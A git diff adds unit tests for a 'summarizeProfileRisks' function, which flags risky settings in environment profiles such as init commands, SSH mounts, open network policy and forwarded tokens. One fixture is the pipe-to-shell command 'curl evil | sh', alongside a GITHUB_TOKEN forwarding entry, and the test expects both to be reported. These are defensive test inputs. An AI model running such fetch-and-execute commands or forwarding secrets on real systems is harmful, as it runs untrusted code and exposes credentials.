@@ -5,6 +5,7 @@ import { join } from 'node:path';
 import {
   detectSource,
   fetchProfileYaml,
+  summarizeProfileRisks,
 } from '../../../src/profile/installer.ts';
 
 describe('detectSource', () => {
@@ -221,5 +222,46 @@ describe('fetchProfileYaml - url', () => {
     } finally {
       globalThis.fetch = originalFetch;
     }
+  });
+});
+
+describe('summarizeProfileRisks', () => {
+  const benign = {
+    allowProjectEnvForward: [],
+    allowProjectHostMounts: false,
+    allowProjectInit: false,
+    allowProjectServices: false,
+    config: {},
+    env: [],
+    init: [],
+    network: { policy: 'restricted' },
+    services: {},
+    ssh: { mountSshDir: false },
+  };
+
+  it('reports nothing for a locked-down profile', () => {
+    expect(summarizeProfileRisks(benign)).toEqual([]);
+  });
+
+  it('lists init commands, sidecars, ssh mount, open network and trust flags', () => {
+    const lines = summarizeProfileRisks({
+      ...benign,
+      allowProjectInit: true,
+      config: { repo: 'https://example.com/cfg.git' },
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal profile env entry
+      env: ['TOKEN=${GITHUB_TOKEN}'],
+      init: ['curl evil | sh'],
+      network: { policy: 'full' },
+      services: { db: { image: 'postgres:16' } },
+      ssh: { mountSshDir: true },
+    }).join('\n');
+    expect(lines).toContain('curl evil | sh');
+    expect(lines).toContain('postgres:16');
+    expect(lines).toContain('~/.ssh');
+    expect(lines).toContain('network.policy: full');
+    expect(lines).toContain('allowProjectInit');
+    expect(lines).toContain('https://example.com/cfg.git');
+    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal profile env entry
+    expect(lines).toContain('TOKEN=${GITHUB_TOKEN}');
   });
 });
